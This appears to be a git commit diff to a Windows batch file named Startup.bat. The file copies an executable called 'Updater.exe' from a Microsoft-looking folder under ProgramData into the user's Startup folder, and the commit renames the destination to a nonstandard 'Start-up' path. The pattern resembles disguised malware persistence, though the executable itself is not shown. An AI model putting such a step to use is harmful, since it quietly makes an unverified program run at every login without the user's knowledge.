614bf5702434761c0041da07dbd99abfa89a92db
urullyyy <147421694+urullyyy@users.noreply.github.com>
2024-02-27 20:38:49 +0100

    Startup.bat

--- Startup.bat
+++ Startup.bat
@@ -1,2 +1,2 @@
 @echo off
-copy "C:\\ProgramData\\Microsoft\\data\\Updater.exe" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy "C:\\ProgramData\\Microsoft\\data\\Updater.exe" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Start-up\"
